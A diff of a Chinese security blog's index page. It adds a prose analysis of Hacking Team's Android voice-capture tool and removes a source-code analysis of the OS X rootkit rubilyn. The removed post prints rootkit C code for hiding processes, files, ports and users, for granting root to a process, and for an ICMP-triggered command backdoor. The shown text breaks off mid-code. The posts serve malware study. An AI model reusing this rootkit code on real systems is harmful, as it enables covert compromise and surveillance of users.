@@ -77,6 +77,80 @@
     <header>
       
         <div class="icon"></div>
+        <time datetime="2015-07-10T04:00:33.000Z"><a href="/2015/07/10/Hacking-Team-武器库研究（三）：core-android-audiocapture/">2015-07-10</a></time>
+      
+      
+  
+    <h1 class="title"><a href="/2015/07/10/Hacking-Team-武器库研究（三）：core-android-audiocapture/">Hacking Team 武器库研究（三）：core-android-audiocapture</a></h1>
+  
+
+    </header>
+    <div class="entry">
+      
+        <p>泄露的core-android-audiocapture一款Android平台下基于DBI Hook框架的语音窃取工具，可窃取当前国内外流行的即时聊天工具，比如wechat、whatsapp、skype等等。</p>
+<p>##【源码分析】</p>
+<p>1、搜索 mediaserver 进程，然后注入libt.so，并将窃取的语音文件dump到指定目录。</p>
+<p><img src="http://riusksk.me/media/hackteam03/1.png" alt=""></p>
+<p>2、查看libt.c源码，其动态链接库的构造函数为my_init，这里参数和返回值都必须为空。</p>
+<p><img src="http://riusksk.me/media/hackteam03/2.png" alt=""></p>
+<p>3、检测当前的Android系统是否为4.x版本，然后分不同的子版本进行处理。</p>
+<p><img src="http://riusksk.me/media/hackteam03/3.png" alt=""></p>
+<p>4、比如对于Android 4.0版本，会指定mStramType和mname的偏移量，不同系统版本对应的偏移量不同，同时也定义一些将被hook的函数，这些Hook_coverage_x是定义在hijack_func/hooker.h中，对应的函数名在注释代码中已经写得很清楚，主要是Hook Android系统的audio接口提供库libaudiofinger.so里的函数，以用于实现录音（RecordThread）和放音（PlaybackThread）功能。</p>
+<p><img src="http://riusksk.me/media/hackteam03/4.png" alt=""><br><img src="http://riusksk.me/media/hackteam03/5.png" alt=""></p>
+<p>5、以Hook回调函数recordTrack_getNextBuffer3_h为例分析下它的修改行为，该函数定义在hijack_func/hooker_thumb.c中，原getNextBuffer获取的缓冲区主要是用于存放录音数据，而录音的开始、停止动作的相关函数也是被hook掉。在recordTrack_getNextBuffer3_h函数中先调用原始函数，得到返回后的结果，然后获取帧大小、采样率、帧数以及原始的AudioBufferProvider::Buffer地址。</p>
+<p><img src="http://riusksk.me/media/hackteam03/6.png" alt=""></p>
+<p>6、创建指定格式的文件名，将语音数据dump出来写入到前面创建的文件：</p>
+<p><img src="http://riusksk.me/media/hackteam03/7.png" alt=""></p>
+<p><img src="http://riusksk.me/media/hackteam03/8.png" alt=""></p>
+<p>7、录音Hook的日志记录如下，其它hook动作类似，此处就不一一分析。</p>
+<p><img src="http://riusksk.me/media/hackteam03/9.png" alt=""></p>
+<p><img src="http://riusksk.me/media/hackteam03/10.png" alt=""></p>
+<p>8、生成的dump文件，会再调用decode.py去转换成wav语音文件</p>
+<p><img src="http://riusksk.me/media/hackteam03/11.png" alt=""></p>
+<p><img src="http://riusksk.me/media/hackteam03/12.png" alt=""></p>
+<p>##【结语】</p>
+<p>网上有人说这工具会去解密微信的语音格式，其实它根本没有做这方面的处理，也没必要，因为它Hook的Android系统的Audio库，当你使用一些即时聊天工具进行语音对话时，就会触发放音的函数，此时语音数据早就可以拿到，而decoder.py只是作一些wav的格式化处理，使得dump出来的文件能够转换成可播放的wav文件。在decoder目录下的一些聊天工具目录，只不过是Hacking Team成员在作一些测试而已。</p>
+
+      
+    </div>
+    
+    <footer>
+        <div class="alignright">
+          
+          <a href="/2015/07/10/Hacking-Team-武器库研究（三）：core-android-audiocapture/#comment" class="comment-link">评论</a>
+          
+          <a href='javascript:void(0)' class="share-link bdsharebuttonbox" data-cmd="more">分享</a>
+        </div>
+        
+  
+  <div class="categories">
+    <a href="/categories/技术分享/">技术分享</a>
+  </div>
+
+        
+  
+  <div class="tags">
+    <a href="/tags/Android/">Android</a>, <a href="/tags/Hacking-Team/">Hacking Team</a>, <a href="/tags/Hook/">Hook</a>
+  </div>
+
+        <!-- partial('post/share') -->
+      <div class="clearfix"></div>
+    </footer>
+
+  </div>
+</article>
+
+<!-- 
+
+ -->
+
+
+  <article class="post">
+  
+  <div class="post-content">
+    <header>
+      
+        <div class="icon"></div>
         <time datetime="2015-07-10T03:00:33.000Z"><a href="/2015/07/10/Hacking-Team-武器库研究（二）：CVE-2015-5119-Flash-0day/">2015-07-10</a></time>
       
       
@@ -660,87 +734,6 @@
  -->
 
 
-  <article class="post">
-  
-  <div class="post-content">
-    <header>
-      
-        <div class="icon"></div>
-        <time datetime="2012-12-31T16:00:00.000Z"><a href="/2013/01/01/osx_rootkit_rubilyn_analyze/">2013-01-01</a></time>
-      
-      
-  
-    <h1 class="title"><a href="/2013/01/01/osx_rootkit_rubilyn_analyze/">Mac OSX rootkit rubilyn 源码分析</a></h1>
-  
-
-    </header>
-    <div class="entry">
-      
-        <h3 id="1、隐藏进程"><a href="#1、隐藏进程" class="headerlink" title="1、隐藏进程"></a>1、隐藏进程</h3><p>在mac osx上,每个进程的上下文都保存在proc结构中,而在allproc链表中就保存着所有进程proc结构的指针，通过allproc链表移除相应进程的proc结构可隐藏正在进行的进程，下面是rubilyn中关于隐藏进程的代码，但目测通过ps -p pid 仍可列出进程，因为它并没有移除进程hash列表pidhashtbl中相关的进程信息，导致可通过pid查找到进程。</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* modify allproc to hide a specific pid */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">hideproc</span><span class="params">(<span class="keyword">int</span> pid)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">proc</span>* <span class="title">p</span>;</span></span><br><span class="line">    <span class="keyword">if</span>(pid!=<span class="number">0</span>)&#123;</span><br><span class="line">	<span class="comment">// lh.first 指向allproc链表中的第1个元素，而p_list.le_next指向下个proc结构</span></span><br><span class="line">        <span class="keyword">for</span> (p = my_allproc-&gt;lh_first; p != <span class="number">0</span>; p = p-&gt;p_list.le_next) </span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(pid == p-&gt;p_pid)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span>(hidden_p_count &lt; MAX_HIDDEN_PROCESS)</span><br><span class="line">                &#123;</span><br><span class="line">                    hidden_p[hidden_p_count]=p;</span><br><span class="line">                    hidden_p_count++;   </span><br><span class="line">                    my_proc_list_lock();</span><br><span class="line">                    LIST_REMOVE(p, p_list); 	<span class="comment">// 移除p_list结构中关于p进程的元素</span></span><br><span class="line">                    my_proc_list_unlock();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h3 id="2、隐藏文件"><a href="#2、隐藏文件" class="headerlink" title="2、隐藏文件"></a>2、隐藏文件</h3><p>为了对列出文件的相应系统函数进行挂钩，我们需要先对finder和ls所使用的函数进行进程跟踪，在mac上已经用Dtrace代替ktrace，在finder上主要是使用getdirentriesattr函数，而ls主要是使用getdirentries64，下面是用Dtrace分别对finder和ls的进程跟踪情况, calltrace.d 脚本内容如下：</p>
-<figure class="highlight d"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">riusksk<span class="keyword">@macosx</span>:/usr/include/sys$ cat ~/Reverse\ engineering/Dtrace/calltrace.d </span><br><span class="line">pid$target:::entry</span><br><span class="line">&#123;</span><br><span class="line">   ;</span><br><span class="line">&#125;</span><br><span class="line">pid$target:::<span class="keyword">return</span></span><br><span class="line">&#123;</span><br><span class="line">   printf(<span class="string">"=%d\n"</span>, arg1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>下面是查看finder进程2841的调用函数：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">riusksk@macosx:/usr/include/sys$ sudo dtrace -s ~/Reverse\ engineering/Dtrace/calltrace.d -p <span class="number">2841</span> | grep getdir</span><br><span class="line">dtrace: script '/Users/riusksk/Reverse engineering/Dtrace/calltrace.d' matched 573227 probes</span><br><span class="line"></span><br><span class="line">  <span class="number">2</span> <span class="number">1078881</span>          getdirentriesattr:entry </span><br><span class="line">  <span class="number">2</span> <span class="number">1363229</span>         getdirentriesattr:<span class="keyword">return</span> =<span class="number">1</span></span><br></pre></td></tr></table></figure>
-<p>下面是ls命令(64位系统)调用的函数：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">riusksk@macosx:~$ sudo dtrace -s ~/Reverse\ engineering/Dtrace/calltrace.d -c ls | grep getdir</span><br><span class="line">dtrace: script &apos;/Users/riusksk/Reverse engineering/Dtrace/calltrace.d&apos; matched 28745 probes</span><br><span class="line">dtrace: pid 3184 has exited</span><br><span class="line">  2 271609          __getdirentries64:entry </span><br><span class="line">  2 285894         __getdirentries64:return =1980</span><br><span class="line">  2 271609          __getdirentries64:entry </span><br><span class="line">  2 285894         __getdirentries64:return =0</span><br></pre></td></tr></table></figure>
-<p>因此，我们若想在finder和ls中隐藏文件，只要对这两个函数 getdirentriesattr 和 getdirentries64 （32位的为getdirentries）进行挂钩处理即可。在系统调用函数表中，主要是由sysent结构数组构成，每个sysent结构中都包括参数个数sy_narg，执行函数sy_call 这些重要数据。sysent结构如下：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sysent</span> &#123;</span> <span class="comment">/* system call table */</span></span><br><span class="line">		<span class="keyword">int16_t</span> sy_narg; <span class="comment">/* number of args */</span></span><br><span class="line">		<span class="keyword">int8_t</span> sy_resv; <span class="comment">/* reserved */</span></span><br><span class="line">		<span class="keyword">int8_t</span> sy_flags; <span class="comment">/* flags */</span></span><br><span class="line">		<span class="keyword">sy_call_t</span> *sy_call; <span class="comment">/* implementing function */</span></span><br><span class="line">		<span class="keyword">sy_munge_t</span> *sy_arg_munge32; <span class="comment">/* system call arguments munger for 32-bit process */</span></span><br><span class="line">		<span class="keyword">sy_munge_t</span> *sy_arg_munge64; <span class="comment">/* system call arguments munger for 64-bit process */</span></span><br><span class="line">		<span class="keyword">int32_t</span> sy_return_type; <span class="comment">/* system call return types */</span></span><br><span class="line">		<span class="keyword">uint16_t</span> sy_arg_bytes; <span class="comment">/* Total size of arguments in bytes for* 32-bit system calls */</span></span><br><span class="line">	&#125;;</span><br></pre></td></tr></table></figure>
-<p>为了实现对上述系统函数的挂钩，通过修改相应函数sysent结构的sy_call来进行偷梁换柱，关于各系统函数的调用号和宏名均可在 /usr/include/sys/syscall.h中找到：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">riusksk@macosx:/usr/include/sys$ cat syscall.h | grep getdir</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span>	SYS_getdirentries  196</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span>	SYS_getdirentriesattr 222</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span>	SYS_getdirentries64 344</span></span><br></pre></td></tr></table></figure>
-<p>下面是rubilyn中对系统调用函数getdirentries64 和 getdirentriesattr的挂钩代码，将这两个函数替换为自定义的 new_getdirentries64  和 new_getdirentriesattr ，同时保存原函数地址方便获取目录信息并进行篡改：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(nsysent)&#123;</span><br><span class="line">    table = find_sysent();</span><br><span class="line">    <span class="keyword">if</span>(table)&#123;</span><br><span class="line">        <span class="comment">/* back up original syscall pointers */</span>    </span><br><span class="line">        org_getdirentries64 = (<span class="keyword">void</span> *) table[SYS_getdirentries64].sy_call; 	<span class="comment">// 保存原系统函数地址</span></span><br><span class="line">        org_getdirentriesattr = (<span class="keyword">void</span> *) table[SYS_getdirentriesattr].sy_call; </span><br><span class="line">        <span class="comment">/* replace syscalls in syscall table */</span></span><br><span class="line">        table[SYS_getdirentries64].sy_call = (<span class="keyword">void</span> *) new_getdirentries64;	<span class="comment">// 替换原系统函数</span></span><br><span class="line">        table[SYS_getdirentriesattr].sy_call = (<span class="keyword">void</span> *) new_getdirentriesattr;</span><br></pre></td></tr></table></figure>
-<p>两个替换函数执行的操作有点类似，主要是移除指定文件的dirent结构，其中dirent结构原型如下：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">dirent</span> &#123;</span></span><br><span class="line">	<span class="keyword">__uint32_t</span> d_fileno; 	<span class="comment">// 节点号</span></span><br><span class="line">	<span class="keyword">__uint16_t</span> d_reclen;	<span class="comment">// 目录项长度</span></span><br><span class="line">	<span class="keyword">__uint8_t</span>  d_type;	<span class="comment">// 文件类型</span></span><br><span class="line">	<span class="keyword">__uint8_t</span>  d_namlen;	<span class="comment">// 文件名</span></span><br><span class="line">   <span class="meta">#<span class="meta-keyword">if</span> __BSD_VISIBLE</span></span><br><span class="line">   <span class="meta">#<span class="meta-keyword">define</span> MAXNAMLEN 255</span></span><br><span class="line">	<span class="keyword">char</span> d_name[MAXNAMLEN+<span class="number">1</span>]; <span class="comment">// 文件名</span></span><br><span class="line">   <span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">	<span class="keyword">char</span> d_name[<span class="number">255</span>+<span class="number">1</span>];	<span class="comment">// 文件名</span></span><br><span class="line">   <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>此处我们只看下 new_getdirentries64 函数，</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* hooked getdirentries64 and friends */</span></span><br><span class="line"><span class="keyword">register_t</span> new_getdirentries64(struct proc *p, struct getdirentries64_args *uap, <span class="keyword">user_ssize_t</span> *retval)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">int</span> ret; </span><br><span class="line">    <span class="keyword">u_int64_t</span> bcount = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">u_int64_t</span> btot = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">size_t</span> buffersize = <span class="number">0</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">direntry</span> *<span class="title">dirp</span>;</span></span><br><span class="line">    <span class="keyword">void</span> *mem = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">int</span> updated = <span class="number">0</span>;</span><br><span class="line">    ret = org_getdirentries64(p,uap,retval); <span class="comment">// 调用原函数获取目录信息</span></span><br><span class="line">    btot = buffersize = bcount = *retval;    <span class="comment">// 函数返回的字节数</span></span><br><span class="line">    <span class="keyword">if</span>(bcount &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        MALLOC(mem,<span class="keyword">void</span> *,bcount,M_TEMP,M_WAITOK);  <span class="comment">// 在内核空间分配bcount大小的内存</span></span><br><span class="line">        <span class="keyword">if</span>(mem == <span class="literal">NULL</span>)</span><br><span class="line">            <span class="keyword">return</span>(ret); </span><br><span class="line">        copyin(uap-&gt;buf, mem, bcount);  <span class="comment">// 将用户空间数据拷贝到刚分配的内核空间</span></span><br><span class="line">        dirp = mem;</span><br><span class="line">        <span class="keyword">while</span>(bcount &gt; <span class="number">0</span> &amp;&amp; dirp-&gt;d_reclen &gt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(dirp-&gt;d_reclen &gt; <span class="number">7</span>)</span><br><span class="line">                <span class="comment">// 搜索指定文件名</span></span><br><span class="line">                <span class="keyword">if</span>(<span class="built_in">strncmp</span>(dirp-&gt;d_name,(<span class="keyword">char</span>*)&amp;k_dir,<span class="built_in">strlen</span>((<span class="keyword">char</span>*)&amp;k_dir)) == <span class="number">0</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">char</span> *next = (<span class="keyword">char</span> *) dirp + dirp-&gt;d_reclen;    <span class="comment">// 下一目录项</span></span><br><span class="line">                    <span class="keyword">u_int64_t</span> offset = (<span class="keyword">char</span> *) next - (<span class="keyword">char</span> *) mem ;	<span class="comment">// 当前文件目录项大小</span></span><br><span class="line">                    bcount -= dirp-&gt;d_reclen;   <span class="comment">// 递减字节数</span></span><br><span class="line">                    btot -= dirp-&gt;d_reclen;     <span class="comment">// 递减目录项长度</span></span><br><span class="line">                    bcopy(next,dirp,buffersize - offset);   <span class="comment">// 覆盖指定文件的目录项，从而实现文件隐藏</span></span><br><span class="line">                    updated = <span class="number">1</span>;</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            bcount -= dirp-&gt;d_reclen;</span><br><span class="line">            dirp = (struct direntry *) ((<span class="keyword">char</span> *) dirp + dirp-&gt;d_reclen);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(updated == <span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            copyout(mem,uap-&gt;buf,btot);     <span class="comment">// 将修改后的数据返回给用户空间</span></span><br><span class="line">            *retval = btot; </span><br><span class="line">        &#125;</span><br><span class="line">        FREE(mem,M_TEMP);   <span class="comment">// 释放内核内存</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h3 id="3、设置Root进程"><a href="#3、设置Root进程" class="headerlink" title="3、设置Root进程"></a>3、设置Root进程</h3><p>先通过pid获取进程proc结构，然后更改其中进程属主字段p_ucred为0，即root属主。源代码如下：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">getroot</span><span class="params">(<span class="keyword">int</span> pid)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">rootpid</span>;</span></span><br><span class="line">    <span class="keyword">kauth_cred_t</span> creds;</span><br><span class="line">    rootpid = proc_find(pid);</span><br><span class="line">    <span class="keyword">if</span>(!rootpid)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    lck_mtx_lock((<span class="keyword">lck_mtx_t</span>*)&amp;rootpid-&gt;p_mlock);    <span class="comment">// 设置互斥锁</span></span><br><span class="line">    creds = rootpid-&gt;p_ucred;   <span class="comment">// 进程属主</span></span><br><span class="line">    creds = my_kauth_cred_setuidgid(rootpid-&gt;p_ucred,<span class="number">0</span>,<span class="number">0</span>); <span class="comment">// 设置进程属主id为0(root)</span></span><br><span class="line">    rootpid-&gt;p_ucred = creds;</span><br><span class="line">    lck_mtx_unlock((<span class="keyword">lck_mtx_t</span>*)&amp;rootpid-&gt;p_mlock);  <span class="comment">// 解锁</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h3 id="4、隐藏网络端口、用户名和内核模块"><a href="#4、隐藏网络端口、用户名和内核模块" class="headerlink" title="4、隐藏网络端口、用户名和内核模块"></a>4、隐藏网络端口、用户名和内核模块</h3><p>通过对write_nocancel函数挂钩，然后对 grep、sysctl、netstat、kextstat、w和who等命令的输出结果进行过滤，当命令输出结果中包含rubilyn模块名以及特写端口和用户名时就直接返回，否则就调用原始的write_nocanel函数。</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* hooked write_nocancel for hiding console stuff */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">new_write_nocancel</span><span class="params">(struct proc* p, struct write_nocancel_args *uap, <span class="keyword">user_ssize_t</span>* retval)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buffer[MAXBUFFER];</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">strncmp</span>(p-&gt;p_comm, grep, <span class="built_in">strlen</span>(p-&gt;p_comm))==<span class="number">0</span>||<span class="built_in">strncmp</span>(p-&gt;p_comm, sysctl,<span class="built_in">strlen</span>(p-&gt;p_comm))==<span class="number">0</span>||</span><br><span class="line">       <span class="built_in">strncmp</span>(p-&gt;p_comm, kextstat,<span class="built_in">strlen</span>(p-&gt;p_comm))==<span class="number">0</span>)&#123;</span><br><span class="line">        bzero(buffer, <span class="keyword">sizeof</span>(buffer));</span><br><span class="line">        copyin(uap-&gt;cbuf, buffer, <span class="keyword">sizeof</span>(buffer)<span class="number">-1</span>);</span><br><span class="line">        <span class="keyword">if</span>(my_strstr(buffer, rubilyn))	</span><br><span class="line">            <span class="keyword">return</span>(uap-&gt;nbyte);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">strncmp</span>(p-&gt;p_comm, netstat,<span class="built_in">strlen</span>(p-&gt;p_comm))==<span class="number">0</span>)&#123;</span><br><span class="line">        bzero(buffer, <span class="keyword">sizeof</span>(buffer));</span><br><span class="line">        copyin(uap-&gt;cbuf, buffer, <span class="keyword">sizeof</span>(buffer)<span class="number">-1</span>);</span><br><span class="line">        <span class="keyword">if</span>(my_strstr(buffer, (<span class="keyword">char</span>*)&amp;k_port))	</span><br><span class="line">            <span class="keyword">return</span>(uap-&gt;nbyte);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>((<span class="built_in">strncmp</span>(p-&gt;p_comm,w,<span class="built_in">strlen</span>(p-&gt;p_comm))==<span class="number">0</span>||<span class="built_in">strncmp</span>(p-&gt;p_comm,who,<span class="built_in">strlen</span>(p-&gt;p_comm))==<span class="number">0</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        bzero(buffer, <span class="keyword">sizeof</span>(buffer));</span><br><span class="line">        copyin(uap-&gt;cbuf, buffer, <span class="keyword">sizeof</span>(buffer)<span class="number">-1</span>);</span><br><span class="line">        <span class="keyword">if</span>(my_strstr(buffer, (<span class="keyword">char</span>*)&amp;k_user))	</span><br><span class="line">            <span class="keyword">return</span>(uap-&gt;nbyte);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> org_write_nocancel(p,uap,retval);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>5、设置ICMP 后门</p>
-<p>首先添加IPv4过滤器ip_filter_ipv4：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">/* install IPv4 filter hook */</span></span><br><span class="line"> ipf_addv4(&amp;ip_filter_ipv4, &amp;ip_filter_ipv4_ref);</span><br><span class="line"></span><br><span class="line">ip_filter_ipv4结构如下：</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">ipf_filter</span> <span class="title">ip_filter_ipv4</span> = &#123;</span></span><br><span class="line">	.name		= <span class="string">"rubilyn"</span>,</span><br><span class="line">	.ipf_input	= ipf_input,</span><br><span class="line">	.ipf_output	= ipf_output,</span><br><span class="line">	.ipf_detach	= ipf_detach,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
-<p>当传给用户的ICMP数据包中包含有以下特定数据时就以root权限执行命令：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* ICMP backdoor configuration */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAGIC_ICMP_TYPE 0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAGIC_ICMP_CODE 255 <span class="comment">/* xor'd magic word*/</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAGIC_ICMP_STR <span class="meta-string">"\x27\x10\x3\xb\x46\x8\x1c\x10\x1e"</span>  <span class="comment">// 解密后为“n0mn0mn0m”</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAGIC_ICMP_STR_LEN 9</span></span><br></pre></td></tr></table></figure>
-<p>ipf_input主要处理传给用户的数据：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> errno_t <span class="title">ipf_input</span><span class="params">(<span class="keyword">void</span>* cookie, <span class="keyword">mbuf_t</span> *data, <span class="keyword">int</span> offset, <span class="keyword">u_int8_t</span> protocol)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[IP_BUF_SIZE];</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">icmp</span> *<span class="title">icmp</span>;</span></span><br><span class="line">    <span class="keyword">if</span> (!(data &amp;&amp; *data))</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">if</span> (protocol != IPPROTO_ICMP)</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    mbuf_copydata(*data, offset, IP_BUF_SIZE, buf);</span><br><span class="line">    icmp = (struct icmp *)&amp;buf;</span><br><span class="line">    <span class="comment">// 检测接收的icmp数据包中是否包含后门的特征数据，若是则调用KUNCExecute函数执行命令</span></span><br><span class="line">    <span class="keyword">if</span>(icmp-&gt;icmp_type==MAGIC_ICMP_TYPE&amp;&amp;icmp-&gt;icmp_code== MAGIC_ICMP_CODE &amp;&amp; <span 